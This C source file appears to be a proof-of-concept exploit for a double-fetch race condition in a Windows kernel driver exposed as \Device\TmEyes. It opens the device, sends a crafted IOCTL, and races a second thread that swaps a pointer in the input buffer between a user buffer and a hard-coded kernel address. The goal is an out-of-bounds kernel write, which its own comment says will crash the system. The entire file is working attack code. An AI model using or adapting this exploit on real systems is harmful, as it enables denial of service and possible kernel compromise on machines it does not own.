// Compile with:
// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /nologo /Ox /MT /W0 /GS- /DNDDEBUG /Tc double_fetch_crash.c /link /OUT:double_fetch_crash.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
#include <windows.h>
#include <stdio.h>

#define DEVICE_NAME L"\\Device\\TmEyes"
#define IOCTL_CODE 0x9000402b
#define SUBCMD_CREATE_FILE 0x2713
#define FILE_READ_DATA_ACCESS 0x0001

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OPEN 0x00000001

typedef NTSTATUS (WINAPI *pNtCreateFile)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG);
typedef VOID (WINAPI *pRtlInitUnicodeString)(PUNICODE_STRING,PCWSTR);
typedef NTSTATUS (WINAPI *pNtClose)(HANDLE);

volatile ULONGLONG *g_pRaceField = NULL;
ULONGLONG g_addrValid = 0;
ULONGLONG g_addrTarget = 0;
volatile LONG g_racing = 0;

DWORD WINAPI RaceThread(LPVOID p)
{
    while (g_racing != -1) {
        while (g_racing == 0) {
            if (g_racing == -1) return 0;
            YieldProcessor();
        }
        if (g_racing == -1) return 0;
        while (g_racing == 1) {
            *g_pRaceField = g_addrTarget;
            *g_pRaceField = g_addrValid;
        }
    }
    return 0;
}

int main(void)
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
    pNtCreateFile NtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    pNtClose NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");

    UNICODE_STRING dn = {0};
    OBJECT_ATTRIBUTES oa = {0};
    IO_STATUS_BLOCK iosb = {0};
    RtlInitUnicodeString(&dn, DEVICE_NAME);
    oa.Length = sizeof(oa);
    oa.ObjectName = &dn;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE hDev = NULL;
    NTSTATUS st = NtCreateFile(&hDev, SYNCHRONIZE | FILE_READ_DATA_ACCESS, &oa, &iosb, NULL, 0, 3, FILE_OPEN, 0, NULL, 0);
    if (!NT_SUCCESS(st)) {
        printf("[-] open device: 0x%08X\n", st);
        return 1;
    }
    printf("[+] Device opened\n");

    WCHAR fp[] = L"\\??\\C:\\Windows\\System32\\notepad.exe";
    ULONG fpLen = (ULONG)(wcslen(fp) * sizeof(WCHAR));

    PUCHAR usBuf1 = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    //PUCHAR usBuf2 = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    PUCHAR oaBuf  = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    PUCHAR ioBuf  = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    PUCHAR inp    = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    PUCHAR out    = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    if (!usBuf1 || !oaBuf || !ioBuf || !inp || !out) {
        printf("[-] alloc failed\n");
        NtClose(hDev);
        return 1;
    }

	ULONGLONG usBuf2 = 0xfffff80634600000; // target kernel address (will cause BSOD)
    g_pRaceField = (volatile ULONGLONG*)(inp + 0x60);
    g_addrValid  = (ULONGLONG)usBuf1;
    g_addrTarget = (ULONGLONG)usBuf2;

    SetThreadAffinityMask(GetCurrentThread(), 1);
    HANDLE hThread = CreateThread(NULL, 0, RaceThread, NULL, CREATE_SUSPENDED, NULL);
    SetThreadAffinityMask(hThread, 2);
    ResumeThread(hThread);

    printf("[*] usBuf1(valid)=%p usBuf2(target)=%p\n", usBuf1, usBuf2);
    printf("[*] Racing input+0x60 between these addresses...\n");

    int raceWon = 0;
    int maxAttempts = 100000;

    for (int i = 1; i <= maxAttempts; i++) {
        memset(usBuf1, 0, 0x10);
        //memset(usBuf2, 0, 0x10);
        memset(oaBuf, 0, 0x30);
        memset(ioBuf, 0, 0x10);
        memset(inp, 0, 0x70);
        memset(out, 0, 0x70);

        *(ULONG*)(inp + 0x00) = SUBCMD_CREATE_FILE;
        *(ULONGLONG*)(inp + 0x10) = (ULONGLONG)fp; // what
        *(ULONG*)(inp + 0x20) = fpLen;
        *(ULONG*)(inp + 0x30) = SYNCHRONIZE;
        *(ULONG*)(inp + 0x34) = 3;
        *(ULONG*)(inp + 0x38) = FILE_OPEN;
        *(ULONG*)(inp + 0x3c) = 0;
        *(ULONG*)(inp + 0x40) = 0;
        *(ULONGLONG*)(inp + 0x60) = g_addrValid; // where

        *(ULONGLONG*)(out + 0x50) = (ULONGLONG)oaBuf;
        *(ULONGLONG*)(out + 0x58) = (ULONGLONG)ioBuf;

        InterlockedExchange(&g_racing, 1);

        DWORD br = 0;
        DeviceIoControl(hDev, IOCTL_CODE, inp, 0x70, out, 0x70, &br, NULL);

        InterlockedExchange(&g_racing, 0);

        HANDLE h = *(HANDLE*)(out + 8);
        if (h && h != INVALID_HANDLE_VALUE) NtClose(h);

        printf("[*] %d/%d attempts...\n", i, maxAttempts);
    }

    printf("[-] Handler never reached\n");

    InterlockedExchange(&g_racing, -1);
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);

    NtClose(hDev);
    VirtualFree(inp, 0, MEM_RELEASE);
    VirtualFree(out, 0, MEM_RELEASE);
    VirtualFree(usBuf1, 0, MEM_RELEASE);
    VirtualFree(usBuf2, 0, MEM_RELEASE);
    VirtualFree(oaBuf, 0, MEM_RELEASE);
    VirtualFree(ioBuf, 0, MEM_RELEASE);
    printf("[*] Done\n");
    return 0;
}